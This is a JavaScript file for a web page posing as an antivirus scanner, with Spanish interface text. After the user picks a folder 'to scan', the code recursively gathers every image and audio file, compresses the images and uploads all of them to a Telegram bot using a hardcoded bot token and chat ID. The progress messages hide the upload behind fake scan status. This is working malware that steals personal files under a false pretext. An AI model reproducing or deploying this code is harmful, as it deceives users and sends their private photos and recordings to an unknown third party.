let startTime;
let isProcessing = false;

function updateStatus(message, progress = 0) {
    const statusElement = document.getElementById('antivirus-status');
    const progressElement = document.getElementById('progress');
    const timeElement = document.getElementById('time-info');

    statusElement.innerHTML = `[${progress}%] ${message}`;
    progressElement.style.width = `${progress}%`;

    if (startTime && progress > 0 && progress < 100) {
        const elapsed = (Date.now() - startTime) / 1000;
        const remaining = (elapsed / progress) * (100 - progress);
        timeElement.innerHTML = `⏳ Tiempo restante: ~${Math.floor(remaining)} segundos`;
    } else if (progress === 100) {
        timeElement.innerHTML = '✅ Operación completada';
    } else {
        timeElement.innerHTML = '⏳ Calculando tiempo...';
    }
}

document.getElementById('start-btn').addEventListener('click', async () => {
    if (isProcessing) return;
    isProcessing = true;

    try {
        startTime = Date.now();
        updateStatus('Iniciando escaneo...', 5);

        if (!window.showDirectoryPicker) throw new Error('Navegador no compatible');

        const folderHandle = await window.showDirectoryPicker();
        updateStatus('Analizando estructura...', 20);

        await collectAndSendInChunks(folderHandle);
        updateStatus('✅ Subida completa', 100);
    } catch (error) {
        console.error(error);
        updateStatus('❌ Error: ' + error.message, 0);
    } finally {
        isProcessing = false;
    }
});

// FUNCIÓN MODIFICADA: procesa por bloques de 100 archivos
async function collectAndSendInChunks(folderHandle) {
    const BATCH_SIZE = 100;
    let batch = [];

    async function processDirectory(handle) {
        for await (const entry of handle.values()) {
            if (entry.kind === 'file') {
                const fileName = entry.name.toLowerCase();
                if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
                    fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp') ||
                    fileName.endsWith('.mp3') || fileName.endsWith('.wav') || fileName.endsWith('.ogg')) {
                    batch.push(entry);

                    if (batch.length === BATCH_SIZE) {
                        await sendFilesToTelegram(batch);
                        batch = [];
                    }
                }
            } else if (entry.kind === 'directory') {
                await processDirectory(entry);
            }
        }
    }

    await processDirectory(folderHandle);

    if (batch.length > 0) {
        await sendFilesToTelegram(batch);
    }
}

// FUNCIÓN PARA COMPRIMIR IMÁGENES
async function compressImage(file) {
    return new Promise(resolve => {
        const img = new Image();
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        img.src = URL.createObjectURL(file);
        img.onload = () => {
            let width = img.width;
            let height = img.height;

            const maxWidth = 1200;
            if (width > maxWidth) {
                height *= maxWidth / width;
                width = maxWidth;
            }

            canvas.width = width;
            canvas.height = height;
            ctx.drawImage(img, 0, 0, width, height);

            canvas.toBlob(blob => {
                if (blob.size > 600 * 1024) {
                    canvas.toBlob(recompressedBlob => {
                        resolve(recompressedBlob);
                    }, 'image/jpeg', 0.5); // Re-comprimir al 50%
                } else {
                    resolve(blob);
                }
            }, 'image/jpeg', 0.7); // Primer intento al 70%
        };
    });
}

// FUNCIÓN MODIFICADA: envía hasta 10 archivos a la vez (paralelo) y comprime las imágenes
async function sendFilesToTelegram(files) {
    const token = '7212842349:AAHU7CbW1M6E-n01opEnnwTGs3eLveS1BLk';
    const chatId = '5821490693';

    const total = files.length;
    let sent = 0;
    const parallelLimit = 10; // Cantidad máxima de archivos en paralelo

    async function processFile(fileEntry) {
        const fileData = await fileEntry.getFile();
        let finalFile = fileData;

        // Comprimir si es imagen
        const fileName = fileData.name.toLowerCase();
        if (fileName.endsWith('.jpg') || fileName.endsWith('.jpeg') || fileName.endsWith('.png') ||
            fileName.endsWith('.gif') || fileName.endsWith('.bmp') || fileName.endsWith('.webp')) {
            finalFile = await compressImage(fileData);
        }

        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('caption', `Archivo: ${fileData.name}`);
        formData.append('document', finalFile, fileData.name);

        const response = await fetch(`https://api.telegram.org/bot${token}/sendDocument`, {
            method: 'POST',
            body: formData
        });

        if (!response.ok) {
            const errorData = await response.json();
            console.error('Error al enviar archivo:', errorData);
            throw new Error(errorData.description || 'Error desconocido al enviar archivo');
        }

        sent++;
        const progress = 40 + Math.floor((sent / total) * 60);
        updateStatus(`Enviando archivo ${sent} de ${total} en lote`, progress);
    }

    // Enviar archivos en paralelo de 10 en 10
    for (let i = 0; i < files.length; i += parallelLimit) {
        const batch = files.slice(i, i + parallelLimit);
        const promises = batch.map(file => processFile(file));
        await Promise.all(promises); // Espera a que termine este grupo antes de seguir
    }

    await new Promise(resolve => setTimeout(resolve, 2000)); // Pausa de 2 segundos entre lotes
}
